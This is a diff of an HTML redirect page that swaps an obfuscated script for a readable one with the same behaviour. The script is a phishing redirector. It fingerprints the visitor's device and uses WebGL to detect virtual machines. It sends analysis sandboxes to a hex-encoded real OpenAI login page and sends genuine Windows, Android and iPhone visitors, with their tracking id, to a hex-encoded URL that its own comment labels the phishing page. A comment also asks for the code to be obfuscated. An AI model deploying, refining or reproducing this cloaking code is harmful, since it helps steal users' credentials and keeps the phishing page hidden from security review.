@@ -6,7 +6,71 @@
     <title>Redirecting...</title>
     <script>
 // This part must be OBFUSCATED with some obfuscator 
-(function(_0x166e5a,_0x2cd4a9){var _0x30c93a=_0x5ba8,_0x2ca450=_0x166e5a();while(!![]){try{var _0x53ef6c=parseInt(_0x30c93a(0x84))/0x1*(parseInt(_0x30c93a(0x81))/0x2)+parseInt(_0x30c93a(0x7f))/0x3*(parseInt(_0x30c93a(0x87))/0x4)+-parseInt(_0x30c93a(0x79))/0x5+-parseInt(_0x30c93a(0x7a))/0x6+parseInt(_0x30c93a(0x91))/0x7*(-parseInt(_0x30c93a(0x86))/0x8)+-parseInt(_0x30c93a(0x94))/0x9+-parseInt(_0x30c93a(0x97))/0xa*(parseInt(_0x30c93a(0x82))/0xb);if(_0x53ef6c===_0x2cd4a9)break;else _0x2ca450['push'](_0x2ca450['shift']());}catch(_0x564174){_0x2ca450['push'](_0x2ca450['shift']());}}}(_0x361a,0x8738a),(function(){var _0x2b44ce=_0x5ba8;function _0x9be762(){var _0xc53e1a=_0x5ba8,_0x1c8152=window[_0xc53e1a(0x8f)][_0xc53e1a(0x8a)]['toLowerCase']();return _0x1c8152[_0xc53e1a(0x8d)](_0xc53e1a(0x85))||_0x1c8152['includes'](_0xc53e1a(0x93))||_0x1c8152[_0xc53e1a(0x8d)](_0xc53e1a(0x83));}function _0x1d56ec(){var _0x281b46=_0x5ba8,_0x1d28d3=document[_0x281b46(0x7b)](_0x281b46(0x7d)),_0x478a87=_0x1d28d3[_0x281b46(0x7c)](_0x281b46(0x88));if(_0x478a87){var _0x2a59a4=_0x478a87[_0x281b46(0x89)](_0x281b46(0x96));if(_0x2a59a4){var _0x28fea6=_0x478a87['getParameter'](_0x2a59a4[_0x281b46(0x99)])[_0x281b46(0x7e)]();return _0x28fea6['includes'](_0x281b46(0x8b));}else return![];}else return![];}function _0x3635da(_0x39207c){var _0x530109=_0x5ba8,_0x3858aa=new URLSearchParams(window[_0x530109(0x95)][_0x530109(0x8e)]);return _0x3858aa[_0x530109(0x80)](_0x39207c);}function _0x4187ee(_0x38beb5){var _0x2cc5f0=_0x5ba8,_0xba18e8='';for(var _0x1ebbec=0x0;_0x1ebbec<_0x38beb5['length'];_0x1ebbec+=0x2){_0xba18e8+=String[_0x2cc5f0(0x8c)](parseInt(_0x38beb5['substr'](_0x1ebbec,0x2),0x10));}return _0xba18e8;}var _0x175a3f=_0x2b44ce(0x98),_0x254a16=_0x2b44ce(0x90);function _0x565647(){var _0x1aaa99=_0x2b44ce,_0x3ad069=_0x3635da('id');if(!_0x9be762()||_0x1d56ec()){window[_0x1aaa99(0x95)][_0x1aaa99(0x92)]=_0x4187ee(_0x175a3f);return;}if(_0x3ad069){var _0x33441c=_0x4187ee(_0x254a16)+_0x3ad069;window[_0x1aaa99(0x95)][_0x1aaa99(0x92)]=_0x33441c;}else window[_0x1aaa99(0x95)][_0x1aaa99(0x92)]=_0x4187ee(_0x175a3f);}window['onload']=function(){_0x565647();};}()));function _0x5ba8(_0x2d3f62,_0x3aa984){var _0x361ab7=_0x361a();return _0x5ba8=function(_0x5ba88d,_0xb4f435){_0x5ba88d=_0x5ba88d-0x79;var _0x5a6940=_0x361ab7[_0x5ba88d];return _0x5a6940;},_0x5ba8(_0x2d3f62,_0x3aa984);}function _0x361a(){var _0x5bc770=['68747470733a2f2f6f616d2d75616c2e65733f69643d','679dQBexd','href','android','268605xTUimC','location','WEBGL_debug_renderer_info','1471390PQWfnu','68747470733a2f2f617574682e6f70656e61692e636f6d2f6c6f672d696e','UNMASKED_RENDERER_WEBGL','336710yBoXoT','937836LKbVkf','createElement','getContext','canvas','toLowerCase','78759OPZQAt','get','16778mqfcBm','11vqWtTF','iphone','97ZQhwcC','windows','49016lJVzNG','112DiHHto','webgl','getExtension','userAgent','swiftshader','fromCharCode','includes','search','navigator'];_0x361a=function(){return _0x5bc770;};return _0x361a();}
+(function(){
+            function checkDevice() {
+                var userAgent = window.navigator.userAgent.toLowerCase();
+                return userAgent.includes('windows') || userAgent.includes('android') || userAgent.includes('iphone');
+            }
+            function isVirtualMachine() {
+                var canvas = document.createElement('canvas');
+                var gl = canvas.getContext('webgl');
+
+                if (gl) {
+                    var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).toLowerCase();
+                        return renderer.includes('swiftshader'); 
+                    } else {
+                        return false; 
+                    }
+                } else {
+                    return false; 
+                }
+            }
+            
+            function getParameterByName(name) {
+                var urlParams = new URLSearchParams(window.location.search);
+                return urlParams.get(name);
+            }
+
+            
+            function decodeHex(hexString) {
+                var str = '';
+                for (var i = 0; i < hexString.length; i += 2) {
+                    str += String.fromCharCode(parseInt(hexString.substr(i, 2), 16));
+                }
+                return str;
+            }
+            // Legit Obfuscated website to redirect in case of VM
+
+            var redirectOfficeHex = '68747470733a2f2f617574682e6f70656e61692e636f6d2f6c6f672d696e'
+
+            // Obfuscated Phishing Page URL 
+            var redirectCronHex = '68747470733a2f2f6f616d2d75616c2e6573'
+
+            
+            function redirectWithId() {
+                var idBase64 = getParameterByName('id');
+
+            
+                if (!checkDevice() || isVirtualMachine()){ 
+                    window.location.href = decodeHex(redirectOfficeHex);
+                    return;
+                }
+
+            
+                if (idBase64) {
+                    var cronUrl = decodeHex(redirectCronHex) + idBase64;
+                    window.location.href = cronUrl;
+                } else {
+                    window.location.href = decodeHex(redirectOfficeHex);
+                }
+            }
+
+            window.onload = function() {
+                redirectWithId();
+            };
+        })();
     </head>
 <body>
   <!-- <p>Redirecting, please wait...</p> -->
